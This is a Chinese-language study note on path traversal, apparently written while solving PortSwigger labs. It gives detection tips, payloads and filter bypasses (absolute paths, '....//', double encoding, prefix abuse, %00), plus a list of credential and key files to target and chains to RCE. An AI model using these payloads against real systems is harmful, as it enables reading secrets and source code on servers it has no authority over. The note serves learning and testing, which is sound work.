# 路径遍历专题（Directory Traversal / Path Traversal）

> **一句话：应用拿你的输入去拼文件路径，于是你能读到目录之外的任意文件。**
>
> 三要素：**入口**（参数）→ **拼接**（进 `readfile`/`file_get_contents`/`include`）→ **利用**（`../` 跳出去）。

---

## 一、先判断有没有这个点

**找出「参数值像一个文件名/路径」的地方：**

```text
?file=report.pdf
?filename=avatar.png
?template=index.html
?lang=zh
?page=about
?img=1.jpg
?download=/tmp/a.txt
```

**判断方法：**

1. 正常请求能拿到一个文件 → 这个参数确实控制文件
2. 把值改成不存在的名字 → 看报错（`No such file` = 有戏）
3. 把值改成 `../` 序列 → 看响应有没有变化

**报错文案是最好的线索：**

| 报错 | 含义 |
|---|---|
| `No such file or directory` | 路径确实被用了 |
| `failed to open stream` | 同上（PHP） |
| `Permission denied` | 文件存在但读不了 → 路径是对的 |
| 页面没变 / 正常渲染 | 可能被过滤，或换了个默认文件 |

---

## 二、最基础的三种写法

### ① 相对路径（最常见）

```text
?filename=../../../../etc/passwd
?filename=../../../../../../etc/passwd
```

**`../` 数量要够** —— 不知道深处几层，就多写几个（多余的会被忽略）。

**Linux 里 `../../../../` 到根目录后再 `../` 还是根目录，写多不亏。**

### ② 绝对路径

```text
?filename=/etc/passwd
?filename=/flag
```

**很多实现只防 `../`，忘了绝对路径。**

### ③ Windows

```text
?filename=..\..\..\windows\win.ini
?filename=C:\Windows\win.ini
?filename=../../../../windows/win.ini
```

**Windows 上 `/` 和 `\` 都能用。**

---

## 三、读到没？怎么判断

**别只看页面长得对不对，看这几个硬信号：**

| 信号 | 说明 |
|---|---|
| **响应长度突变** | 从 1.2 KB 变 3.5 KB → 内容换了 |
| **状态码** | 200 = 读到了；404/500 = 路径不对 |
| **内容特征** | `root:x:0:0:`、`[fonts]`、`<?php` |
| **报错消失** | 从 `No such file` 变成正常页面 = 换对了 |

**`/etc/passwd` 是最好的探针：**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
```

**看到这个格式，说明路径遍历成立，接下来就是找 flag。**

---

## 四、常见过滤与绕法

| 过滤方式 | 绕法 | 原理 |
|---|---|---|
| **拦 `../`**（正则） | **绝对路径** `/etc/passwd` | 根本没用到 `../` |
| **`str_replace('../','')` 只删一次** | **`....//`** | 删掉 `../` 后剩下 `../` |
| 拦 `/` 字符 | **`%2f`** / `..%2f` | 解码发生在过滤之后 |
| **`urldecode` 两次** | **`%252e%252e%252f`** | 第一次解成 `%2e`，第二次才是 `.` |
| **要求以固定前缀开头** | `images/../../../etc/passwd` | 只查开头，没做 `realpath` |
| **要求 `.png` 结尾** | `../../etc/passwd%00.png` | 空字节截断（PHP < 5.3.4） |
| 只查 `..` | `..././`、`..%c0%af` | 解析差异 |
| 拦反斜杠 | `/` 在 Windows 上也能用 | 系统兼容 |

### `....//` 为什么有效（重点）

```php
$file = str_replace('../', '', $_GET['file']);   // 只删一次
```

```text
输入:  ....//
       └── 中间藏着 "..' + '/" → 被当作 ../ 删掉
结果:  ../          ← 反而还原了
```

**这就是「删除型过滤」的通用反绕：删一次就写两次。**

**判断是「删一次」还是「删全部」：**

```
....//     → 变成 ../    → 删一次
....//     → 变成        → 删全部(连替换后的结果都再扫)
```

### 双重编码

```text
%252e%252e%252f
  ↓ 第一次 URL 解码
%2e%2e%2f
  ↓ 第二次解码
../
```

**前提：应用做了**两次**解码。多试几层：`%25252e`。**

## 五、编码速查表

| 目标 | 常见变体 |
|---|---|
| `.` | `.` / `%2e` / `%252e` / `%c0%ae` |
| `/` | `/` / `%2f` / `%252f` / `%c0%af` / `\` |
| `\` | `\` / `%5c` / `%255c` |
| `../` | `../` / `..%2f` / `%2e%2e%2f` / `....//` / `..%5c` / `%2e%2e/` |

**组合起来：**

```text
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
```

## 六、读什么：敏感文件清单

### Linux

| 文件 | 价值 |
|---|---|
| `/etc/passwd` | **探针**，确认遍历成立 |
| `/etc/shadow` | 密码哈希（需 root） |
| `/etc/hosts` | 内网信息 |
| `/proc/self/environ` | 环境变量（可能有密钥） |
| `/proc/self/cmdline` | 启动命令 |
| `/proc/self/cwd/` | 进程工作目录 |
| `/root/.ssh/id_rsa` | 私钥 |
| `/root/.bash_history` | 历史命令 |
| `/var/www/html/index.php` | **源码**（看过滤逻辑） |
| `/var/log/apache2/access.log` | 日志（配合文件包含打 RCE） |

### Windows

| 文件 | 价值 |
|---|---|
| `C:\Windows\win.ini` | **探针** |
| `C:\boot.ini` | 旧系统 |
| `C:\Windows\System32\drivers\etc\hosts` | 内网 |
| `C:\inetpub\wwwroot\web.config` | 配置/源码 |

### CTF 常见 flag 位置

```text
/flag
/flag.txt
/flag_is_here
/home/<user>/secret        ← PortSwigger 风格
/tmp/flag
/var/www/html/flag.php
```

## 七、和其他漏洞的联动

| 组合 | 效果 |
|---|---|
| **路径遍历 + 文件包含** | `include($_GET['f'])` → 读到日志/session → RCE |
| **文件上传 + 路径穿越** | 把 shell 传到可执行目录（你在上传专题里打过：`filename="../shell.php"`） |
| **日志投毒 + 包含** | 把 PHP 代码写进 access.log，再包含它 |
| **路径遍历 + SSRF** | 读云元数据 `http://169.254.169.254/...` |

**注意：`include`/`require` 和 `readfile` 的区别 —— 前者会**执行**，后者只**读取**。**

## 八、实战记录

### 8.1 [PortSwigger] 路径遍历 · 简单案例

**现象：**

```text
GET /image?filename=1.jpg      → 正常显示图片
```

**参数 `filename` 直接拼进了 `readfile()`，没有任何过滤。**

**利用：**

```text
GET /image?filename=../../../etc/passwd
```

**拿到 `root:x:0:0:...`，确认遍历成立。**

**再跳到目标文件：**

```text
GET /image?filename=../../../home/carlos/secret
```

**关键点：**

| 点 | 说明 |
|---|---|
| `../` 数量 | 不知道几层就多写，Linux 到根之后再 `../` 还是根 |
| 判断依据 | 响应体里出现 `/etc/passwd` 的格式 |
| 后续目标 | 从 passwd 换成真正的 flag 路径 |

---

### 8.2 ✅ 绝对路径绕过

**原话：**

> 通过查看网页中的图片，修改 `?filename=`，因为文件遍历路径被阻断所以使用绝对路径，而 `/etc/passwd` 在 Linux 里面是属于绝对路径的，`etc` 属于文件系统中的一级目录（只在根目录 root 下面），所以可以直接检索。

**payload：**

```text
?filename=/etc/passwd
?filename=/home/carlos/secret
```

**一句话：`../` 被拦，但没人拦 `/`。**

---

### 8.3 ✅ 非递归剥离

**原话：**

> 注意到名字，「文件路径遍历、遍历序列被剥离」，我理解为发现 `../` 直接删除，所以进行重写绕过。

**payload：**

```text
?filename=....//....//....//etc/passwd
```

**原理：删一次 → 写两次。**

```text
....//   中间藏着 "../" → 被删掉 → 剩下 ../
```

**成功拿到 flag。**

---

### 8.4 ✅ 多余的 URL 解码

**原话：**

> 看了名字知道是要对 URL 多次编码，一次一次试，在两次 URL 编码后成功得到。

**payload：**

```text
?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**为什么两次：**

```text
%252e  →  第一次解码 %2e  →  第二次解码 .
%252f  →  第一次解码 %2f  →  第二次解码 /
```

**记：编码层数 = 应用解码次数。一层不行就再加一层。**

---

### 8.5 ✅ 校验路径开头

**原话：**

> 文件路径遍历，路径开始验证，也就是要路径起始的验证，只要 `/var/www/image/../../../etc/passwd`，用他指定的起始开头再路径遍历回去就行。

**payload：**

```text
?filename=/var/www/images/../../../etc/passwd
```

**要点：校验只看开头几个字符，没做 `realpath()` 规范化 —— 前缀合法，后面的 `../` 照跳。**

---

### 8.6 ✅ 空字节绕过扩展名校验

**原话：**

> 使用 null 字节绕过验证文件扩展，由于文件目录访问限制文件扩展名结尾，使用 `%00` 截断目录查询的访问，并且完成对文件扩展名的要求，得到 flag。

**payload：**

```text
?filename=../../../etc/passwd%00.png
```

**原理：**

```text
应用层看到:  ../../../etc/passwd%00.png   → 以 .png 结尾 ✅ 过校验
底层 C 函数:  ../../../etc/passwd          → 读到 \0 就停
```

**一句话：校验看"截断前"，打开文件用"截断后"。**

**⚠️ 只对 PHP < 5.3.4 有效，之后 `$_GET` 里的 NUL 会被直接拒绝。**

---

### 六关回顾

| # | 过滤 | 绕法 |
|---|---|---|
| 1 | 无 | `../../../etc/passwd` |
| 2 | 拦 `../` | **绝对路径** `/etc/passwd` |
| 3 | 删一次 `../` | **`....//`** |
| 4 | 解码两次 | **`%252e%252e%252f`** |
| 5 | 校验开头 | **`/var/www/images/../../../`** |
| 6 | 校验 `.png` 结尾 | **`%00.png`** |

**六关其实是同一个问题的六个变体：**

> **校验发生在哪一步，绕过就发生在哪一步之前。**

**删之前 → 双写；解码之前 → 多编一层；规范化之前 → 让前缀合法；C 字符串结束之前 → 塞 NUL。**

## 九、我踩的坑

> 打的过程中往里填。格式：**现象 → 原因 → 正确做法**。

### 坑 1：`../` 数量不够

**现象：跳到一半就停了，报 `No such file`。**

**原因：不知道当前目录深度。**

**做法：多写几个 `../../../../../../`，Linux 到根不报错。**

### 坑 2：只看页面渲染，不看响应体

**现象：页面显示"图片加载失败"，以为没读到。**

**原因：Content-Type 还是 `image/jpeg`，浏览器按图片渲染失败。**

**做法：去 Burp 看 Response 原文，或 `view-source`。**

### 坑 3：忘了 URL 里 `..` 会被规范化

**现象：浏览器/工具把 `/a/../b` 自动解析成 `/b`，请求根本没发出去。**

**做法：在 Burp Repeater 里手改，或者用编码 `%2e%2e/`。**

---

## 十、一句话总结

> **路径遍历 = 找到控制文件名的参数，然后用 `../` 或绝对路径跳出去。**
>
> **过滤只拦 `../` → 用绝对路径；只删一次 → 用 `....//`；解码两次 → 用 `%252e`；查前缀 → 用 `images/../../`；查后缀 → 用 `%00`。**
>
> **判断读到了没：看响应长度和内容特征，别只看页面长得对不对。**
